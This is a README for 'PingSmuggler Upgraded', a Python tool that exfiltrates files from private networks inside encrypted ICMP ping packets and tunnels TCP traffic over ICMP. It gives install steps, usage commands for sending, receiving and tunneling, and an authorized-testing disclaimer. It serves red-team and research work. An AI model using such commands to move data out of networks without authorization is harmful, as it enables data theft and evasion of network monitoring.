# PingSmuggler Upgraded

![Python Version](https://img.shields.io/badge/python-3.8%2B-blue)
![License](https://img.shields.io/badge/license-MIT-green)
![Status](https://img.shields.io/badge/status-active-brightgreen)
![Code Style](https://img.shields.io/badge/code%20style-PEP8-yellow)

## About

`PSU` is a tool originally developed by `0x7sec` (https://github.com/0x7sec) as a way to exfiltrate data from a private network via sending encrypted payloads disguised as ICMP ping packets. This rewrite extends the concept with enhanced `send` and `recv` functionality, support for bidirectional TCP tunneling over ICMP, and improved encryption standards.

## Features

- **Data Exfiltration**: Send files and data via encrypted ICMP packets
- **Packet Capture**: Receive and decrypt ICMP-tunneled data
- **TCP Tunneling**: Tunnel TCP connections over ICMP using client-server architecture
- **AES Encryption**: 128-bit CBC encryption with PKCS7 padding
- **Flexible Configuration**: Adjustable chunk sizes, delays, and ICMP types
- **Cross-Platform**: Works on Linux, macOS, and Windows (with appropriate permissions)

## Index

- [About](#about)
- [Features](#features)
- [Setup & Install](#setup--install)
- [Module Installation](#module-installation)
- [Usage](#usage)
- [Deactivation](#deactivation-venv)
- [Credits](#credits)
- [Disclaimer](#discliamer)

## Setup & Install

> (**NOTE :**) The functionality of this tool requires `scapy` and `cryptography` to be installed. Administrator/root privileges are required for ICMP packet manipulation.

### Setup

```bash
python3 -m venv PSUEnviron
```

### Activation

Activation of the virtual environment is pretty straight forward.

_Suggested :_ `powershell`(windows), `fish`(linux)

> (NOTE) : _`nushell` terminal does not display/operate correctly with the venv, it is best to stay with `powershell`._

#### Windows

__Powershell__

```powershell
.\PSUEnviron\Scripts\Activate.ps1
```

__Batch__

```batch
.\PSUEnviron\Scripts\activate.bat
```

#### Linux

__Bash__

```sh
source PSUEnviron/bin/activate
```

__Fish__

```sh
source PSUEnviron/bin/activate.fish
```

### Module Installation

```markdown
python3 -m pip install -r requirements.txt
```

The central modules for this project is `scapy` & `cryptography`.

> (**NOTE**):  _`scapy` itself and the `ICMP` operations need `root`/`admin` privs to work. There is also a possibility of it raising `false positives` from some `anti-virus` softwares. This is due to the real-world operations this smuggling technique has been used for, user-discretion is advised!_

Alternativly you can directly install the modules via:

```markdown
python3 -m pip install scapy cryprography
```

## Usage

### Generate AES Keys

* Works on both `linux` and `windows`, without deferences.

```markdown
python3 PSU.py generate-key -s 16
```

Keys can be `16`, `24`, or `32` bytes long.

### Send Data

```markdown
(sudo) python3 PSU.py send <destination-ip> <aes-key> -d 'data'
(sudo) python3 PSU.py send <destination-ip> <aes-key> -f /path/to/file
```

### Recieve Data

```markdown
(sudo) python3 PSU.py recv <aes-key> <output-file> <output.pcap> 
## output-file & output.pcap are optional (under-construction but currently functional)
```

### Listen for Tunneled Traffic

```markdown
(sudo) python3 PSU.py listen <aes-key> <forward-host> <forard-port>
```

### Tunnel Client

```markdown
(sudo) python3 PSU.py connect <aes-key> <server-host> <local-port> <remote-port>
```

## Deactivation Venv

```markdown
deactivate
```

## Credits

### Original Author

* **`0x7sec`**
    - _GitHub :_ `https://github.com/0x7sec`
    - _Original Repo:_ `https://github.com/0x7sec/pingSmuggler`

### Rewrite & Enhancement Author

* **`J4ck3LSyN`**
    - _GitHub :_ `https://github.com/J4ck3LSyN-Gen2`
    - _Upgrade Repo :_ `https://github.com/J4ck3LSyN-Gen2/pingSmugglerUpgraded/tree/main`

## Discliamer

> (**DISCLAIMER**) This tool is provided for authorized testing and educational purposes only. Unauthorized network access and data exfiltration are illegal. Users are responsible for ensuring they have proper authorization before using this tool on any network.